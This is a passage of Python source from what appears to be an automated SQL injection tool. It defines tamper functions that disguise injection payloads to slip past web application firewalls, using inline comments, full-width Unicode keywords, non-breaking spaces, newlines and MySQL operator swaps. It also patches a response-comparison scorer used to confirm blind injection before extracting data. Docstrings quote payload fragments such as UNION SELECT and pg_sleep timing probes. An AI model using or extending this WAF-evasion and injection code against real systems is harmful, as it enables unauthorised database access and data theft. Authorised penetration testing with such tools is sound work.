# Extend TamperLib with new v18 tampers
def _tamper_v18_dollar_comment(p: str) -> str:
    """BUG-V40-1 FIX: Was replacing ALL spaces with '$$/**/$$' (invalid SQL outside PG
    dollar-quoting context) then failing to restore any because the follow-up
    .replace('$$/**/$$ ', ' ') never matched (the space had already been
    swallowed in step 1).  Result: every payload containing spaces was converted to
    completely unrecognisable SQL — PCV canary ' AND SUBSTRING(...)' became
    '$$/**/$$&&$$/**/$$SUBSTRING(...)' → server returns syntax-error page for BOTH
    true and false probes → gap=0 → ALL PCV confirmations rejected.

    Fix: insert /**/ inline comments BETWEEN SQL keywords only (not replacing spaces),
    which is valid in every major DBMS and actually evades WAF keyword-boundary rules.
    Uses a non-destructive regex that preserves all spaces and SQL structure."""
    return re.sub(
        r'(\b(?:AND|OR|NOT|SELECT|FROM|WHERE|UNION|INSERT|UPDATE|DELETE|'
        r'ORDER|GROUP|HAVING|LIMIT|OFFSET|JOIN|ON|AS|IN|IS|NULL|LIKE|'
        r'BETWEEN|CASE|WHEN|THEN|ELSE|END|EXISTS|DISTINCT|ALL|ANY)\b)',
        r'/**/\1/**/',
        p,
        flags=re.I
    )

def _tamper_v18_pg_cast(p: str) -> str:
    """BUG-V40-2 FIX: ::int cast syntax is PostgreSQL-ONLY and silently breaks
    MSSQL/MySQL/Oracle/SQLite payloads that happen to contain 'CAST(x AS int)'.
    The old code applied this to every DBMS unconditionally.
    Fix: leave non-PostgreSQL payloads untouched.  The payload is PostgreSQL if it
    contains pg_sleep, ::, EXTRACT(EPOCH, or other PG-specific markers."""
    _pg_markers = ('pg_sleep', '::', 'extract(epoch', 'generate_series',
                   'current_database()', 'pg_tables', 'information_schema')
    if any(m in p.lower() for m in _pg_markers):
        return re.sub(r'CAST\((.+?) AS int\)', r'(\1)::int', p, flags=re.I)
    return p

def _tamper_v18_mysql_pipe_or(p: str, dbms: str = '') -> str:
    """BUG-V40-3 FIX: OR→|| is MySQL/MariaDB-only.  In Oracle || is string
    concatenation; in PostgreSQL it can mean bitwise OR or concatenation depending
    on context.  Applying this to non-MySQL payloads corrupts SQL semantics.

    BUG-V40-3a ADDITIONAL FIX: Original _mysql_markers included 'sleep(' which is a
    SUBSTRING of 'pg_sleep(' (PostgreSQL) and 'DBMS_LOCK.SLEEP(' (Oracle), causing false
    positive matching and transforming AND→&& in PostgreSQL/Oracle payloads.
    Fix: use explicit DBMS parameter gate first; fallback to MySQL-SPECIFIC-ONLY markers."""
    _dbms_lower = (dbms or '').lower()
    if _dbms_lower in ('mysql', 'mariadb'):
        return re.sub(r'\bOR\b', '||', p, flags=re.I)
    # Explicit non-MySQL — never transform (avoids string-concat corruption in Oracle)
    if _dbms_lower in ('postgresql', 'postgres', 'oracle', 'mssql', 'sqlserver',
                       'sqlite', 'sqlite3'):
        return p
    # Unknown DBMS: only apply for MySQL-SPECIFIC identifiers (not generic SQL terms)
    _mysql_only = ('@@version', '@@global.', 'mysql.user', 'group_concat(',
                   'information_schema.tables', 'information_schema.columns',
                   'ifnull(', 'benchmark(1', 'limit 1,1')
    if any(m in p.lower() for m in _mysql_only):
        return re.sub(r'\bOR\b', '||', p, flags=re.I)
    return p

def _tamper_v18_mysql_and_bit(p: str, dbms: str = '') -> str:
    """BUG-V40-4 FIX: AND→&& is MySQL/MariaDB-only.  In PostgreSQL/Oracle/MSSQL/
    SQLite, && is either invalid syntax or a bitwise AND (not logical AND), so this
    converts logically-valid boolean conditions into syntax errors on every non-MySQL
    DBMS.  This was applied to ALL DBMSes via _V18_TAMPER_FNS, making PostgreSQL
    timing payloads like 'AND CASE WHEN ... THEN pg_sleep(0.3) END' become
    '&& CASE WHEN ...' — invalid PostgreSQL SQL → CHECK-B PCV always fails for
    non-MySQL timing injections.

    BUG-V40-4a ADDITIONAL FIX: Original _mysql_markers included 'sleep(' which is a
    substring of 'pg_sleep(' and 'DBMS_LOCK.SLEEP(' — this caused AND→&& to fire on
    PostgreSQL/Oracle payloads that contain pg_sleep/DBMS_LOCK.SLEEP.
    Fix: explicit DBMS gate first; MySQL-SPECIFIC-ONLY fallback markers."""
    _dbms_lower = (dbms or '').lower()
    if _dbms_lower in ('mysql', 'mariadb'):
        return re.sub(r'\bAND\b', '&&', p, flags=re.I)
    # Explicit non-MySQL — never transform
    if _dbms_lower in ('postgresql', 'postgres', 'oracle', 'mssql', 'sqlserver',
                       'sqlite', 'sqlite3'):
        return p
    # Unknown DBMS: only apply for MySQL-SPECIFIC identifiers
    _mysql_only = ('@@version', '@@global.', 'mysql.user', 'group_concat(',
                   'information_schema.tables', 'information_schema.columns',
                   'ifnull(', 'benchmark(1', 'limit 1,1')
    if any(m in p.lower() for m in _mysql_only):
        return re.sub(r'\bAND\b', '&&', p, flags=re.I)
    return p  # safe default: don't corrupt unknown payloads

def _tamper_v18_unicode_keyword(p: str) -> str:
    """BUG-V40-5 FIX: The original fw_map had ALL values as empty strings ''.
    This caused unicodify(kw) to return '' for every keyword, meaning
    re.sub(r'\\bSELECT\\b', '', payload) DELETED keywords instead of replacing them
    with Unicode lookalikes.  Result: ' UNION SELECT 1,2,3' became ' 1,2,3'
    — completely broken SQL.

    Fix: populate fw_map with the actual Unicode full-width characters (U+FF21..FF5A).
    NFKC normalization on the server side converts these back to ASCII, so the DB
    parses valid SQL while WAF keyword-scanners looking for exact ASCII matches miss them.
    Gate: skip if the payload already contains full-width chars to avoid double-encoding."""
    if '\uff33' in p:       # already has full-width chars — skip
        return p
    fw_map = {
        'S': '\uff33', 'E': '\uff25', 'L': '\uff2c', 'C': '\uff23', 'T': '\uff34',
        'U': '\uff35', 'N': '\uff2e', 'I': '\uff29', 'O': '\uff2f',
        'F': '\uff26', 'R': '\uff32', 'M': '\uff2d', 'W': '\uff37', 'H': '\uff28',
        'A': '\uff21', 'D': '\uff24',
    }
    def unicodify(kw: str) -> str:
        return "".join(fw_map.get(c.upper(), c) for c in kw)
    for kw in ("SELECT", "UNION", "FROM", "WHERE"):
        if kw in p.upper():
            p = re.sub(rf'\b{kw}\b', unicodify(kw), p, count=1, flags=re.I)
    return p

def _tamper_v18_space2nbsp(p: str) -> str:
    """BUG-V40-6 FIX: The original code used "\\xc2\\xa0" which in Python 3 is
    a 2-character string: U+00C2 (Â) followed by U+00A0 (NBSP).  The comment
    said 'UTF-8 encoded U+00A0' but Python strings are Unicode — the UTF-8 byte
    sequence 0xC2 0xA0 maps to TWO Unicode characters when decoded char-by-char.
    Inserting 'Â' before every space produces invalid multi-byte garbage in the
    HTTP request body that is not non-breaking space, causing SQL syntax errors.

    Fix: use the single-character Python escape \\xa0 (U+00A0, non-breaking space).
    Gate: skip Oracle payloads — Oracle's NLS charset handling can reject U+00A0
    in SQL text before NFKC normalization, causing ORA-00911 (invalid character).

    BUG-TAMPER-SPACE2NBSP-NON-MYSQL FIX (MEDIUM, PostgreSQL/MSSQL/SQLite detection):
    The previous fix skipped Oracle but still applied U+00A0 substitution to
    PostgreSQL, MSSQL, and SQLite detection payloads.  These three DBMSes do NOT
    recognise U+00A0 (non-breaking space, \\xa0) as SQL whitespace:
      PostgreSQL: rejects \\xa0 as an invalid character in SQL text → syntax error.
      MSSQL:      treats \\xa0 as part of an identifier token, not as whitespace
                  → token boundaries shift → syntax error on nearly every payload.
      SQLite:     does not include \\xa0 in its whitespace set → syntax error.
    When space2nbsp fires on a detection payload for these DBMSes, BOTH the
    true-condition probe and the false-condition probe return SQL-error pages.
    The boolean oracle sees no difference between them → gap ≈ 0 → the injection
    is NOT confirmed → extraction never starts on PostgreSQL, MSSQL, or SQLite.
    This affects ALL techniques (B/BH/E/EH/U/UE/UH/S/IN/NV/WB/EX/HY/T/TH/HQ/ST)
    and ALL surfaces (URL, POST, JSON, header BG injection, cookie).
    MySQL/MariaDB are safe: MySQL's multi-byte charset handling does accept \\xa0
    as whitespace in most server configurations (utf8mb4, utf8, latin1).
    Fix: add PostgreSQL, MSSQL, and SQLite DBMS markers to the skip condition."""
    _p_lower = p.lower()
    # Skip Oracle payloads (DBMS_PIPE, DUAL, ROWNUM are Oracle markers)
    _oracle_markers = ('dbms_pipe', 'from dual', 'rownum', 'ora-', 'dbms_lock',
                       'dbms_session', 'all_objects', 'all_tables', 'dba_')
    if any(m in _p_lower for m in _oracle_markers):
        return p
    # BUG-TAMPER-SPACE2NBSP-NON-MYSQL FIX: also skip PostgreSQL, MSSQL, SQLite.
    # U+00A0 is not recognised as SQL whitespace by these DBMSes — it causes
    # syntax errors on every detection probe, preventing extraction from starting.
    _pg_markers = ('pg_sleep', '::int', '::text', '::integer', 'pg_tables',
                   'pg_catalog', 'current_database()', 'string_agg(',
                   'information_schema', 'pg_namespace', 'pg_class',
                   'current_schema()', 'pg_database', 'pg_user', 'char_length(')
    if any(m in _p_lower for m in _pg_markers):
        return p
    _mssql_markers = ('waitfor', 'nvarchar', 'sys.objects', 'sys.tables',
                      'sys.columns', 'for xml path', 'db_name()', '@@servername',
                      'isnull(unicode(', 'isnull(datalength', 'suser_name()',
                      'sys.databases', 'row_number()', 'fetch next',
                      'sys.sql_logins', 'sys.database_principals')
    if any(m in _p_lower for m in _mssql_markers):
        return p
    _sqlite_markers = ('sqlite_version', 'sqlite_master', 'sqlite_schema',
                       'pragma ', 'pragma_table_info', 'randomblob(',
                       'pragma_database_list')
    if any(m in _p_lower for m in _sqlite_markers):
        return p
    return p.replace(" ", "\xa0")

def _tamper_v18_nl_between(p: str) -> str:
    """Insert newlines between SQL keywords (accepted by all major DBMS as whitespace).
    BUG-V40-7 FIX: The original looped over each keyword with re.sub (no flags=re.I
    was used in some earlier versions, but the real issue is double-substitution when
    the same keyword appears multiple times and the loop compounds replacements from
    earlier iterations).  Fix: make a single combined substitution pass so each
    keyword token is processed exactly once."""
    return re.sub(
        r'(\b(?:AND|OR|WHERE|FROM|UNION|SELECT|HAVING|ORDER|GROUP|LIMIT)\b)',
        r'\n\1\n',
        p,
        flags=re.I
    )

# Patch TamperLib with v18 methods
TamperLib.dollar_comment   = _tamper_v18_dollar_comment
TamperLib.pg_cast          = _tamper_v18_pg_cast
TamperLib.pipe_or          = _tamper_v18_mysql_pipe_or
TamperLib.and_bit          = _tamper_v18_mysql_and_bit
TamperLib.unicode_keyword  = _tamper_v18_unicode_keyword
TamperLib.space2nbsp       = _tamper_v18_space2nbsp
TamperLib.nl_between       = _tamper_v18_nl_between

# BUG-V32-8 FIX (Req 9/CPU): Populate _V18_TAMPER_FNS now that all _tamper_v18_*
# functions are defined. The module-level placeholder (see SQLMutationEngine preamble)
# is updated here so mutate_all()'s TamperLib phase can reference this tuple directly
# without re-evaluating globals() or callable() on every call (~101K times on cold cache).
_V18_TAMPER_FNS = tuple(fn for fn in [
    _tamper_v18_dollar_comment,
    _tamper_v18_pg_cast,
    _tamper_v18_mysql_pipe_or,
    _tamper_v18_mysql_and_bit,
    _tamper_v18_unicode_keyword,
    _tamper_v18_space2nbsp,
    _tamper_v18_nl_between,
] if callable(fn))

# BUG-V41-2 FIX (Req 9/CPU): Pre-compute arity (parameter count) for every function
# in _V18_TAMPER_FNS once at module init time. mutate_all() previously called
# `import inspect; inspect.signature(fn)` INSIDE the per-payload per-tamper loop —
# ~1.75M signature inspections per scan (300 payloads × 10 cats × 17 techs × 5 DBMSes
# × 7 tampers). Each inspect.signature() allocates Signature + N Parameter objects.
# This dict replaces all those allocations with a single O(1) id() → int lookup.
# Uses id() as key because function objects have stable identity throughout the session.
# Populated once here; referenced in mutate_all() as _V18_TAMPER_FN_ARITY.
try:
    import inspect as _inspect_arity
    _V18_TAMPER_FN_ARITY: dict = {
        id(fn): len(_inspect_arity.signature(fn).parameters)
        for fn in _V18_TAMPER_FNS
    }
    del _inspect_arity
except Exception:
    # Fallback: assume 1-parameter (safe: functions without dbms param still work).
    # The 2-parameter functions (mysql_pipe_or, mysql_and_bit) default to p-only
    # call which omits the dbms gate — they fall back to heuristic markers, which
    # was the pre-V40 behaviour and is still correct (just slightly less precise).
    _V18_TAMPER_FN_ARITY: dict = {id(fn): 1 for fn in _V18_TAMPER_FNS}


# Extend REGISTRY
TamperLib.REGISTRY.update({
    "dollar_comment", "pg_cast", "pipe_or", "and_bit",
    "unicode_keyword", "space2nbsp", "nl_between",
})


# 
# 19.  RESPONSE FINGERPRINT IMPROVEMENTS   v18 diff_score enhancement
# 

_orig_diff_score = ResponseFingerprint.diff_score

def _v18_diff_score(self, other: "ResponseFingerprint") -> float:
    """
    v18 enhanced diff_score:
       Adds SimHash body comparison on top of the original metric
        (original only used length/status/words).
       Weights: SimHash (40%), status (30%), length (20%), words (10%).
    """
    try:
        original_score = _orig_diff_score(self, other)
        if not self.body or not other.body:
            return original_score
        norm_a = ResponseNormaliser.normalise(_extract_body_safe(self)) if _validate_response(self, allow_empty=True) else b""
        norm_b = ResponseNormaliser.normalise(_extract_body_safe(other)) if _validate_response(other, allow_empty=True) else b""
        simhash_sim = SimHasher.body_similarity(norm_a, norm_b)
        # Blend: 40% SimHash, 60% original metrics
        blended = 0.40 * simhash_sim + 0.60 * original_score
        return round(blended, 4)
    except Exception:
        return _orig_diff_score(self, other)

ResponseFingerprint.diff_score = _v18_diff_score


